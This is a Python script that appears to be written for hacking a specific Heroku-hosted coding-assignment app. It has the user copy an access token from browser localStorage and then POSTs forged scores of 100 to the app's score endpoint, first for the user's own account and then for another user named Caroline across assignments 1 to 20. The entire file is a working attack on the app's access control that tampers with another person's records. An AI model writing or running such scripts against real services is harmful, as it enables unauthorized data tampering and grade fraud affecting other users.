#!/usr/bin/env python3
"""
Browser automation approach to get fresh token and try hacking
"""

import requests
import time

def test_with_fresh_approach():
    """
    This script will guide you through getting a fresh token
    """
    
    print("🌟 FRESH TOKEN APPROACH")
    print("="*50)
    print()
    print("Follow these steps:")
    print()
    print("1. Open https://coolcode-hacker-34c5455cd908.herokuapp.com in your browser")
    print("2. Open Developer Tools (F12)")
    print("3. Go to Console tab")
    print("4. Type: localStorage.getItem('ACCESS_TOKEN')")
    print("5. Copy the token (without quotes)")
    print("6. Come back here and run this test")
    print()
    
    # Ask user to input fresh token
    fresh_token = input("Paste the fresh ACCESS_TOKEN here: ").strip()
    
    if not fresh_token:
        print("❌ No token provided!")
        return
    
    print(f"\n🔄 Testing with fresh token: {fresh_token[:20]}...")
    
    # Test the fresh token
    url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    
    headers = {
        "Content-Type": "application/json",
        "ACCESS_TOKEN": fresh_token
    }
    
    # Test with your own username first
    test_data = {
        "username": "CX8de3ce71-3cbTY",  # Your username from token
        "assignmentId": 1,
        "score": 100
    }
    
    try:
        response = requests.post(url, json=test_data, headers=headers, timeout=10)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ Fresh token works! Now trying Caroline...")
            
            # Try Caroline
            test_data["username"] = "98ixul"
            response = requests.post(url, json=test_data, headers=headers, timeout=10)
            print(f"Caroline attempt - Status: {response.status_code}")
            print(f"Caroline attempt - Response: {response.text}")
            
            if response.status_code == 200:
                print("🎉 SUCCESS! Can hack Caroline's scores!")
                
                # Ask if user wants to hack all assignments
                hack_all = input("\nHack all assignments for Caroline? (y/n): ").lower()
                if hack_all == 'y':
                    hack_all_assignments(fresh_token)
            else:
                print("❌ Cannot modify Caroline's scores")
        else:
            print("❌ Fresh token still doesn't work")
            
    except Exception as e:
        print(f"❌ Error: {e}")

def hack_all_assignments(token):
    """Hack all assignments for Caroline with working token"""
    
    url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    headers = {
        "Content-Type": "application/json",
        "ACCESS_TOKEN": token
    }
    
    print("\n🚀 Hacking all assignments for Caroline...")
    success_count = 0
    
    for assignment_id in range(1, 21):
        test_data = {
            "username": "98ixul",
            "assignmentId": assignment_id, 
            "score": 100
        }
        
        try:
            response = requests.post(url, json=test_data, headers=headers, timeout=10)
            if response.status_code == 200:
                print(f"✅ Assignment {assignment_id}: SUCCESS!")
                success_count += 1
            else:
                print(f"❌ Assignment {assignment_id}: Failed")
        except:
            print(f"❌ Assignment {assignment_id}: Error")
            
        time.sleep(0.5)  # Be nice to the server
    
    print(f"\n🎉 Successfully hacked {success_count} assignments!")

if __name__ == "__main__":
    test_with_fresh_approach()
